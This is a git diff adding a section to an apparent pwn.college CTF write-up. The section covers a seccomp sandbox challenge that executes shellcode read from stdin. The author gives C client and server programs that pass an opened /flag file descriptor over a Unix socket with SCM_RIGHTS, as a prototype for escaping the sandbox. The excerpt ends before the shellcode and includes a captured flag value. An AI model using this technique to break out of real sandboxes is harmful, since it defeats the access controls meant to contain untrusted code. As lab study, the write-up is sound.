@@ -1969,4 +1969,263 @@ FOUND_FLAG: pwn.college{g67jNvYwczJ3iXJDI8KMmPyi2Ha.QX4UTMyIDLzQDMyQzW}
 [*] Reading STDERR (BAR 2)
 ```
 
-## Day 10 -
+## Day 10 - Unix domain sockets fd passing
+
+Another very interesting `seccomp` challenge with a short source code:
+```c
+#include <errno.h>
+#include <seccomp.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <linux/seccomp.h>
+
+#define SANTA_FREQ_ADDR (void *)0x1225000
+
+int setup_sandbox()
+{
+    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
+        perror("prctl(NO_NEW_PRIVS)");
+        return 1;
+    }
+
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+    if (!ctx) {
+        perror("seccomp_init");
+        return 1;
+    }
+
+    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(recvmsg), 0) < 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendmsg), 0) < 0 ||
+        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
+        perror("seccomp_rule_add");
+        return 1;
+    }
+
+    if (seccomp_load(ctx) < 0) {
+        perror("seccomp_load");
+        return 1;
+    }
+
+    seccomp_release(ctx);
+
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    puts("📡 Tuning to Santa's reserved frequency...");
+    void *code = mmap(SANTA_FREQ_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    if (code != SANTA_FREQ_ADDR) {
+        perror("mmap");
+        return 1;
+    }
+
+    puts("💾 Loading incoming elf firmware packet...");
+    if (read(0, code, 0x1000) < 0) {
+        perror("read");
+        return 1;
+    }
+
+    puts("🧝 Protecting station from South Pole elfs...");
+    if (setup_sandbox() != 0) {
+        perror("setup_sandbox");
+        return 1;
+    }
+
+    // puts("🎙️ Beginning uplink communication...");
+    ((void (*)())(code))();
+
+    // puts("❄️ Uplink session ended.");
+    return 0;
+}
+```
+
+This time the syscalls allowed are `openat`, `recvmsg`, `sendmsg` and `exit_group`. I fell into a couple of rabbit holes when trying to solve this one as there's not much information really online about this specific usage of the syscalls. But once I realised the main idea, the implementation was quite easy. 
+
+<div class="box-note">
+SCM_RIGHTS is a feature used in Unix-domain sockets that allows a process to send a file descriptor to another process using the sendmsg system call
+</div>
+
+We can test this idea using a client and server implemented in C, before coding the needed shellcode in assembly. The client mainly opens a Unix socket, listens for incoming connections and accepts a connection. Once a connection is made, it then receives some dummy data and a file descriptor in ancillary data. Using the file descriptor we can then read the file directly:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+
+#define SOCKET_PATH "./socket_path"
+
+int main() {
+    int listen_sfd, client_sfd, received_fd = -1;
+    struct sockaddr_un addr;
+    struct msghdr msg = {0};
+    struct iovec iov[1];
+    char data_buf[100];
+    char control_buf[CMSG_SPACE(sizeof(int))];      // Buffer for SCM_RIGHTS
+
+    // Create a socket and bind it to a file path
+    listen_sfd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (listen_sfd == -1) {
+        perror("[Client] socket");
+        return 1;
+    }
+
+    // Ensure the socket file doesn't exist from a previous run
+    unlink(SOCKET_PATH); 
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+
+    if (bind(listen_sfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
+        perror("[Client] bind");
+        close(listen_sfd);
+        return 1;
+    }
+    printf("[Client] Listening on socket: %s\n", SOCKET_PATH);
+
+    // Listen and wait for the exploited program (Server) to connect
+    if (listen(listen_sfd, 5) == -1) {
+        perror("[Client] listen");
+        close(listen_sfd);
+        return 1;
+    }
+
+    client_sfd = accept(listen_sfd, NULL, NULL);
+    if (client_sfd == -1) {
+        perror("[Client] accept");
+        close(listen_sfd);
+        return 1;
+    }
+    close(listen_sfd); // Done listening
+    printf("[Client] Server connected. Preparing to receive FD.\n");
+
+    // Setup iovec (to receive dummy data)
+    iov[0].iov_base = data_buf;
+    iov[0].iov_len = sizeof(data_buf);
+
+    // Setup msghdr for receiving
+    msg.msg_iov = iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = control_buf;
+    msg.msg_controllen = sizeof(control_buf);
+
+    // Call recvmsg to receive the dummy data and the FD in ancillary data
+    ssize_t n = recvmsg(client_sfd, &msg, 0);
+    if (n < 0) {
+        perror("[Client] recvmsg");
+        close(client_sfd);
+        return 1;
+    }
+    printf("[Client] Received %zd bytes of dummy data.\n", n);
+
+    // Check the ancillary data for the file descriptor
+    struct cmsghdr *cmsg;
+    for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
+        if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
+            // Found the transferred FD!
+            received_fd = *(int *)CMSG_DATA(cmsg);
+            printf("[Client] SUCCESSFULLY RECEIVED FILE DESCRIPTOR: %d\n", received_fd);
+            break;
+        }
+    }
+
+    if (received_fd == -1) {
+        printf("[Client] FAILED to find SCM_RIGHTS data.\n");
+        close(client_sfd);
+        return 1;
+    }
+
+    // Use the received FD to read the file contents directly
+    char flag_contents[100];
+    ssize_t flag_n = read(received_fd, flag_contents, sizeof(flag_contents) - 1);
+
+    if (flag_n > 0) {
+        flag_contents[flag_n] = '\0';
+        printf("File contents: %s\n", flag_contents);
+    } else {
+        perror("[Client] Final read failed");
+    }
+
+    // Cleanup
+    close(received_fd);
+    close(client_sfd);
+    unlink(SOCKET_PATH);
+
+    return 0;
+}
+```
+
+The server is privileged and can open the flag file. It then opens the same socket created by the client and sends a message of type `SCM_RIGHTS` with the file descriptor inside the ancillary data:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+
+#define SOCKET_PATH "./socket_path"
+#define FLAG_FILE "/flag"
+
+int main(int argc, char *argv[]) {
+    int sfd = 3, flag_fd;
+    struct sockaddr_un addr;
+    struct msghdr msg = {0};
+    struct iovec iov[1];
+    char control_buf[CMSG_SPACE(sizeof(int))];  // Buffer for SCM_RIGHTS
+    char data_buf[] = "Sending FD";             // Dummy data required for sendmsg
+
+    // Open the file we want to "leak"
+    flag_fd = open(FLAG_FILE, O_RDONLY);
+    if (flag_fd < 0) {
+        perror("[Server] open");
+        return 1;
+    }
+    printf("[Server] Opened flag file. FD: %d\n", flag_fd);
+    // Setup iovec
+    iov[0].iov_base = data_buf;
+    iov[0].iov_len = sizeof(data_buf);
+
+    // Setup msghdr
+    msg.msg_iov = iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = control_buf;
+    msg.msg_controllen = sizeof(control_buf);
+
+    // Setup cmsghdr to use SCM_RIGHTS
+    struct cmsghdr *cmsg;
+    cmsg = CMSG_FIRSTHDR(&msg);
+    cmsg->cmsg_level = SOL_SOCKET;
+    cmsg->cmsg_type = SCM_RIGHTS;
+    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
+    *((int *)CMSG_DATA(cmsg)) = flag_fd; // Attach the file descriptor
+
+    msg.msg_controllen = cmsg->cmsg_len;
+
+    // Send the message with the FD inside the ancillary data
+    printf("[Server] Sending flag FD %d via sendmsg...\n", flag_fd);
+    if (sendmsg(sfd, &msg, 0) == -1) {
+        perror("[Server] sendmsg");
+        close(sfd);
+        close(flag_fd);
+        return 1;
+    }
+
+    printf("[Server] Successfully sent file descriptor.\n");
+    close(sfd);
+    close(flag_fd);
+    return 0;
+}
+```
+
+Let's test these two first:
+
+
